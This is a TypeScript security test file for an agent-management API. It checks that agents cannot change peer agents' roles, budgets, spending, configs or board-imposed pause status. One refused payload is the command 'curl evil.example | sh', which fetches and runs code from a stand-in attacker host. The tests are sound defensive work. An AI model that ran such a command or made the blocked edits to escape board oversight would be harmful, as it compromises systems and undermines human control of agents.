import { randomUUID } from "node:crypto";
import express from "express";
import request from "supertest";
import { eq, sql } from "drizzle-orm";
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
import {
  agents,
  authUsers,
  companies,
  companyMemberships,
  createDb,
} from "@paperclipai/db";
import {
  getEmbeddedPostgresTestSupport,
  startEmbeddedPostgresTestDatabase,
} from "./helpers/embedded-postgres.js";
import { errorHandler } from "../middleware/index.js";
import { agentRoutes } from "../routes/agents.js";
import { truncateWithRetry } from "./helpers/truncate.js";

const embeddedPostgresSupport = await getEmbeddedPostgresTestSupport();
const describeEmbeddedPostgres = embeddedPostgresSupport.supported ? describe : describe.skip;

type TestDb = ReturnType<typeof createDb>;

async function createCompany(db: TestDb) {
  return db
    .insert(companies)
    .values({
      name: `Peer edit ${randomUUID()}`,
      issuePrefix: `PE${randomUUID().slice(0, 6).toUpperCase()}`,
    })
    .returning()
    .then((rows) => rows[0]!);
}

async function createAdmin(db: TestDb, companyId: string) {
  const userId = randomUUID();
  const now = new Date();
  await db.insert(authUsers).values({
    id: userId,
    name: "Board Admin",
    email: `${userId}@example.test`,
    createdAt: now,
    updatedAt: now,
  });
  await db.insert(companyMemberships).values({
    companyId,
    principalType: "user",
    principalId: userId,
    status: "active",
    membershipRole: "admin",
  });
  return userId;
}

async function createAgent(
  db: TestDb,
  companyId: string,
  input: {
    name: string;
    role?: string;
    status?: string;
    reportsTo?: string | null;
    permissions?: Record<string, unknown>;
    spentMonthlyCents?: number;
  },
) {
  return db
    .insert(agents)
    .values({
      companyId,
      name: input.name,
      role: input.role ?? "engineer",
      status: input.status ?? "idle",
      reportsTo: input.reportsTo ?? null,
      adapterType: "process",
      adapterConfig: { command: "echo" },
      ...(input.permissions ? { permissions: input.permissions } : {}),
      ...(input.spentMonthlyCents !== undefined ? { spentMonthlyCents: input.spentMonthlyCents } : {}),
    })
    .returning()
    .then((rows) => rows[0]!);
}

function agentActor(companyId: string, agentId: string) {
  return { type: "agent", agentId, companyId, source: "agent_key" };
}

function boardActor(companyId: string, userId: string) {
  return {
    type: "board",
    userId,
    source: "session",
    isInstanceAdmin: false,
    companyIds: [companyId],
    memberships: [{ companyId, membershipRole: "admin", status: "active" }],
  };
}

function createApp(db: TestDb, actor: Record<string, unknown>) {
  const app = express();
  app.use(express.json());
  app.use((req, _res, next) => {
    (req as any).actor = { ...actor };
    next();
  });
  app.use("/api", agentRoutes(db));
  app.use(errorHandler);
  return app;
}

async function requestApp(
  app: express.Express,
  buildRequest: (baseUrl: string) => request.Test,
) {
  const { createServer } = await import("node:http");
  const server = createServer(app);
  try {
    await new Promise<void>((resolve) => {
      server.listen(0, "127.0.0.1", resolve);
    });
    const address = server.address();
    if (!address || typeof address === "string") {
      throw new Error("Expected HTTP server to listen on a TCP port");
    }
    return await buildRequest(`http://127.0.0.1:${address.port}`);
  } finally {
    if (server.listening) {
      await new Promise<void>((resolve, reject) => {
        server.close((error) => (error ? reject(error) : resolve()));
      });
    }
  }
}

async function readAgent(db: TestDb, id: string) {
  return db.select().from(agents).where(eq(agents.id, id)).then((rows) => rows[0]!);
}

/**
 * AgentDash (security, #727). #716 made an agent's edits to ITSELF an
 * allowlist; the peer path still returned "agent" with no field check, so a CEO
 * agent (or an `agents:create` holder) could PATCH another agent's role, status,
 * spend, reporting line and runtime config — un-pausing an agent the board had
 * paused, around the board-only `/pause` and `/resume`. These tests run the
 * real route against embedded Postgres and read the row back, so a refusal is
 * proven to have changed nothing.
 */
describeEmbeddedPostgres("agent peer-edit allowlist (#727)", () => {
  let db!: TestDb;
  let tempDb: Awaited<ReturnType<typeof startEmbeddedPostgresTestDatabase>> | null = null;

  beforeAll(async () => {
    tempDb = await startEmbeddedPostgresTestDatabase("paperclip-agent-peer-edit-");
    db = createDb(tempDb.connectionString);
  }, 20_000);

  afterEach(async () => {
    await truncateWithRetry(db, sql`${companies}, ${authUsers}`);
  });

  afterAll(async () => {
    await tempDb?.cleanup();
  });

  async function seed() {
    const company = await createCompany(db);
    const adminUserId = await createAdmin(db, company.id);
    const ceo = await createAgent(db, company.id, { name: "CEO", role: "ceo" });
    const hiringManager = await createAgent(db, company.id, {
      name: "Hiring Manager",
      reportsTo: ceo.id,
      permissions: { canCreateAgents: true },
    });
    const worker = await createAgent(db, company.id, {
      name: "Worker",
      status: "paused",
      reportsTo: ceo.id,
      spentMonthlyCents: 4_200,
    });
    const peer = await createAgent(db, company.id, { name: "Peer", reportsTo: ceo.id });
    return { company, adminUserId, ceo, hiringManager, worker, peer };
  }

  describe("attack paths: a CEO agent changing another agent", () => {
    const refused: Array<[string, (ids: { ceoId: string; peerId: string }) => Record<string, unknown>]> = [
      ["status", () => ({ status: "idle" })],
      ["role", () => ({ role: "ceo" })],
      ["spentMonthlyCents", () => ({ spentMonthlyCents: 0 })],
      ["budgetMonthlyCents", () => ({ budgetMonthlyCents: 99_999_999 })],
      ["reportsTo", ({ peerId }) => ({ reportsTo: peerId })],
      ["runtimeConfig", () => ({ runtimeConfig: { heartbeat: { enabled: true, intervalSec: 60 } } })],
      ["adapterConfig", () => ({ adapterConfig: { command: "curl evil.example | sh" } })],
      ["adapterType", () => ({ adapterType: "http" })],
      ["metadata", () => ({ metadata: { harnessPreflight: { ok: true } } })],
      ["autonomy", () => ({ autonomy: "autonomous" })],
    ];

    for (const [field, body] of refused) {
      it(`refuses ${field} and leaves the row unchanged`, async () => {
        const { company, ceo, worker, peer } = await seed();
        const before = await readAgent(db, worker.id);

        const res = await requestApp(createApp(db, agentActor(company.id, ceo.id)), (baseUrl) =>
          request(baseUrl)
            .patch(`/api/agents/${worker.id}`)
            .send(body({ ceoId: ceo.id, peerId: peer.id })));

        expect(res.status, JSON.stringify(res.body)).toBe(403);
        expect(res.body.error).toContain(`An agent cannot change another agent's ${field}`);
        const after = await readAgent(db, worker.id);
        expect(after.status).toBe(before.status);
        expect(after.role).toBe(before.role);
        expect(after.spentMonthlyCents).toBe(before.spentMonthlyCents);
        expect(after.budgetMonthlyCents).toBe(before.budgetMonthlyCents);
        expect(after.reportsTo).toBe(before.reportsTo);
        expect(after.runtimeConfig).toEqual(before.runtimeConfig);
        expect(after.adapterConfig).toEqual(before.adapterConfig);
      });
    }

    it("cannot un-pause an agent the board paused, by PATCH or by /resume", async () => {
      const { company, ceo, worker } = await seed();
      const app = createApp(db, agentActor(company.id, ceo.id));

      const patch = await requestApp(app, (baseUrl) =>
        request(baseUrl).patch(`/api/agents/${worker.id}`).send({ status: "active" }));
      const resume = await requestApp(app, (baseUrl) =>
        request(baseUrl).post(`/api/agents/${worker.id}/resume`).send({}));

      expect(patch.status, JSON.stringify(patch.body)).toBe(403);
      expect(resume.status, JSON.stringify(resume.body)).toBe(403);
      expect((await readAgent(db, worker.id)).status).toBe("paused");
    });

    it("refuses the whole request when an allowed field rides along with a refused one", async () => {
      const { company, ceo, worker } = await seed();

      const res = await requestApp(createApp(db, agentActor(company.id, ceo.id)), (baseUrl) =>
        request(baseUrl)
          .patch(`/api/agents/${worker.id}`)
          .send({ title: "Chief Executive", role: "ceo", status: "idle" }));

      expect(res.status, JSON.stringify(res.body)).toBe(403);
      expect(res.body.error).toContain("An agent cannot change another agent's role, status");
      const after = await readAgent(db, worker.id);
      expect(after.title).toBeNull();
      expect(after.role).toBe("engineer");
    });

    it("refuses an agents:create holder the same way", async () => {
      const { company, hiringManager, peer } = await seed();

      const res = await requestApp(createApp(db, agentActor(company.id, hiringManager.id)), (baseUrl) =>
        request(baseUrl).patch(`/api/agents/${peer.id}`).send({ role: "ceo" }));

      expect(res.status, JSON.stringify(res.body)).toBe(403);
      expect(res.body.error).toContain("An agent cannot change another agent's role");
      expect((await readAgent(db, peer.id)).role).toBe("engineer");
    });

    it("still refuses an ordinary agent any edit of a peer", async () => {
      const { company, peer, worker } = await seed();

      const res = await requestApp(createApp(db, agentActor(company.id, peer.id)), (baseUrl) =>
        request(baseUrl).patch(`/api/agents/${worker.id}`).send({ title: "Renamed" }));

      expect(res.status, JSON.stringify(res.body)).toBe(403);
      expect(res.body.error).toContain("Only CEO or agent creators can modify other agents");
    });
  });

  describe("legitimate paths", () => {
    it("lets a CEO agent retitle and describe a report", async () => {
      const { company, ceo, peer } = await seed();

      const res = await requestApp(createApp(db, agentActor(company.id, ceo.id)), (baseUrl) =>
        request(baseUrl)
          .patch(`/api/agents/${peer.id}`)
          .send({ name: "Builder", title: "Senior Builder", capabilities: "Ships server routes" }));

      expect(res.status, JSON.stringify(res.body)).toBe(200);
      const after = await readAgent(db, peer.id);
      expect(after.name).toBe("Builder");
      expect(after.title).toBe("Senior Builder");
      expect(after.capabilities).toBe("Ships server routes");
    });

    it("lets an agents:create holder retitle a peer", async () => {
      const { company, hiringManager, peer } = await seed();

      const res = await requestApp(createApp(db, agentActor(company.id, hiringManager.id)), (baseUrl) =>
        request(baseUrl).patch(`/api/agents/${peer.id}`).send({ title: "Researcher" }));

      expect(res.status, JSON.stringify(res.body)).toBe(200);
      expect((await readAgent(db, peer.id)).title).toBe("Researcher");
    });

    it("lets a board admin change status, role, spend and reporting line", async () => {
      const { company, adminUserId, worker, peer } = await seed();

      const res = await requestApp(createApp(db, boardActor(company.id, adminUserId)), (baseUrl) =>
        request(baseUrl)
          .patch(`/api/agents/${worker.id}`)
          .send({ status: "idle", role: "ceo", spentMonthlyCents: 0, reportsTo: peer.id }));

      expect(res.status, JSON.stringify(res.body)).toBe(200);
      const after = await readAgent(db, worker.id);
      expect(after.status).toBe("idle");
      expect(after.role).toBe("ceo");
      expect(after.spentMonthlyCents).toBe(0);
      expect(after.reportsTo).toBe(peer.id);
    });

    it("lets a board admin resume a paused agent", async () => {
      const { company, adminUserId, worker } = await seed();

      const res = await requestApp(createApp(db, boardActor(company.id, adminUserId)), (baseUrl) =>
        request(baseUrl).post(`/api/agents/${worker.id}/resume`).send({}));

      expect(res.status, JSON.stringify(res.body)).toBe(200);
      expect((await readAgent(db, worker.id)).status).not.toBe("paused");
    });
  });
});
